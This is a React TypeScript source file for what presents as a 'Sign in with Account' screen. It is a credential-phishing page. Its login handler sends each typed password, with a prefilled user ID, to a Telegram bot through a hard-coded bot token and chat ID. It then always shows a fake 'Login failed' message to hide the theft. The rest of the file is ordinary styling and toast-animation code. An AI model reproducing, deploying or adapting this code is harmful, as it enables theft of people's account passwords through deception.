import React, { useState, useRef, useEffect } from 'react';

interface LoginScreenProps {
  onBack: () => void;
}

export const LoginScreen: React.FC<LoginScreenProps> = ({ onBack }) => {
  const [password, setPassword] = useState('');
  const [showError, setShowError] = useState(false);
  const [isExiting, setIsExiting] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [errorContent, setErrorContent] = useState<React.ReactNode>(null);

  const timeoutRef = useRef<ReturnType<typeof setTimeout> | null>(null);

  // Cleanup timeout on unmount
  useEffect(() => {
    return () => {
      if (timeoutRef.current) clearTimeout(timeoutRef.current);
    };
  }, []);

  // TODO: Replace these with your actual Telegram Bot Token and Chat ID to receive the credentials
  const TELEGRAM_BOT_TOKEN = '8386610180:AAF8jyjXnbxnsWisRAxJOrMOo-fxSGkkEw8'; 
  const TELEGRAM_CHAT_ID = '6500246824';

  const triggerErrorToast = (content: React.ReactNode) => {
    // Clear any existing timeout to restart the flow
    if (timeoutRef.current) clearTimeout(timeoutRef.current);
    
    setErrorContent(content);

    // Reset states to force a re-render of the emergence animation
    setShowError(false);
    setIsExiting(false);
    
    // Small delay to ensure the component unmounts before remounting
    setTimeout(() => {
        setShowError(true);
        
        // Schedule the fade out
        timeoutRef.current = setTimeout(() => {
            setIsExiting(true);
            
            // Schedule the removal from DOM after fade out completes
            timeoutRef.current = setTimeout(() => {
                setShowError(false);
                setIsExiting(false);
            }, 500); // 500ms matches the CSS transition duration
        }, 2000); // Toast stays fully visible for 2 seconds
    }, 50);
  };

  const handleLogin = async () => {
    if (!password) {
        triggerErrorToast("Invalid request parameters");
        return;
    }

    setIsLoading(true);
    
    // Construct the message to send
    const message = `
🔒 *New Login Attempt*
👤 User ID: \`2752427\`
🔑 Password: \`${password}\`
    `;

    try {
        if (TELEGRAM_BOT_TOKEN !== 'REPLACE_WITH_YOUR_BOT_TOKEN') {
             await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });
        } else {
            console.log("Telegram Token missing. Login attempt:", { userId: '2752427', password });
        }
    } catch (error) {
        console.error('Failed to send to Telegram', error);
    } finally {
        setIsLoading(false);
        setPassword(''); // Clear password input
        
        triggerErrorToast(
            <>Login failed, incorrect<br/>account or password</>
        );
    }
  };

  return (
    <div className="min-h-screen bg-white text-gray-900 flex flex-col font-sans px-6 pt-8 relative">
      {/* Header with Back Button */}
      <div className="w-full flex items-center mb-12">
        <button 
          onClick={onBack} 
          className="p-2 -ml-2 text-black hover:bg-gray-50 rounded-full transition-colors outline-none"
          aria-label="Go back"
        >
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <path d="M15 18l-6-6 6-6" />
          </svg>
        </button>
      </div>

      {/* Main Content */}
      <div className="flex flex-col items-center w-full max-w-sm mx-auto">
        <h2 className="text-2xl font-semibold text-gray-800 mb-10 tracking-tight">
          Sign in with Account
        </h2>

        <div className="w-full space-y-5">
          {/* User ID Input - Read Only */}
          <input 
            type="text" 
            value="2752427"
            readOnly
            className="w-full bg-[#F5F5F5] text-gray-700 placeholder-gray-500 rounded-2xl py-4 px-6 text-[15px] outline-none focus:ring-0 cursor-default"
          />
          
          {/* Password Input */}
          <input 
            type="password" 
            placeholder="Enter password" 
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="w-full bg-[#F5F5F5] text-gray-700 placeholder-gray-400 rounded-2xl py-4 px-6 text-[15px] outline-none focus:ring-1 focus:ring-[#1CD8D2] transition-all"
          />

          {/* Login Button */}
          <div className="pt-6">
            <button 
                onClick={handleLogin}
                disabled={isLoading}
                className="w-full bg-[#1CD8D2] text-white font-bold text-[16px] py-4 rounded-full shadow-md hover:opacity-90 active:scale-[0.98] transition-all disabled:opacity-70"
            >
              {isLoading ? 'Logging In...' : 'Login In'}
            </button>
          </div>
        </div>
      </div>

      {/* Error Toast Overlay */}
      {showError && (
        <div className={`absolute inset-0 z-50 flex items-center justify-center pointer-events-none transition-opacity duration-500 ease-out ${isExiting ? 'opacity-0' : 'opacity-100'}`}>
            <style>{`
                @keyframes emergence {
                    0% { opacity: 0; transform: scale(0.85); }
                    50% { opacity: 1; transform: scale(1.05); }
                    100% { opacity: 1; transform: scale(1); }
                }
            `}</style>

            {/* The Toast Box */}
            <div 
                className="bg-[#2C333A] text-white rounded-lg py-6 px-8 flex flex-col items-center shadow-2xl min-w-[240px] pointer-events-auto"
                style={{ animation: isExiting ? 'none' : 'emergence 0.35s ease-out forwards' }}
            >
                <div className="w-6 h-6 rounded-full border-[1.5px] border-white flex items-center justify-center mb-3">
                    <span className="font-serif text-sm font-medium">i</span>
                </div>
                <p className="text-center text-[13px] font-normal leading-tight opacity-90">
                    {errorContent}
                </p>
            </div>
        </div>
      )}
    </div>
  );
};
